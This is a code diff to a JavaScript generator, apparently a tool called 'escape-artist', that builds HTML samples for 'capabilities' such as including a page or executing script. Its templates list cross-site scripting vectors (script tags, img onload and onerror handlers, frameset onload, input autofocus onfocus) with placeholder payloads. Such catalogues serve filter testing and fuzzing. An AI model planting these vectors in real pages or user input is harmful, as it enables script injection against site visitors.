@@ -1,5 +1,5 @@
 CONFIG_HOST= "localhost";
-CONFIG_PATH = "~freddy";
+CONFIG_PATH = "~freddy/escape-artist/";
 
 var caps = {
   /* a dictionary of capability names and examples to exercise them.
@@ -17,8 +17,8 @@ var caps = {
   'CAP_INCLUDE_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', '']} } ], // the most powerful you can get...descending from here
   'CAP_EXECUTE_SCRIPT': [
     {'tagName': 'script', 'attributes': {}, 'content': ['X-payload', 'text/javascript']},
-    {'tagName': 'script', 'attributes': {'src': ['X-payload', 'text/javascript']} },
-    {'tagName': 'img', 'attributes': {'src': ['X-url', 'image/*'], 'onload': ['X-payload', 'text/javascript']} },
+    {'tagName': 'script', 'attributes': {'src': ['X-url', 'text/javascript']} },
+    {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
     {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
     {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
     {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}},
@@ -182,7 +182,7 @@ function choice(arr) {
 }
 
 function capCodeToHTML(cc) {
-  console.log("Generating " + cc['tagName'] + " tag.");
+  //console.log("Generating " + cc['tagName'] + " tag.");
   var tag = '<' + cc['tagName'];
   for (var att in cc['attributes']) {
     var attVal = cc['attributes'][att];
@@ -221,7 +221,3 @@ function exerciseRandomCapability() {
   console.log("Generating a sample for " + cap_name);
   console.log(exerciseCapability(cap_name));
 }
-
-exerciseRandomCapability();
-
-debugger;
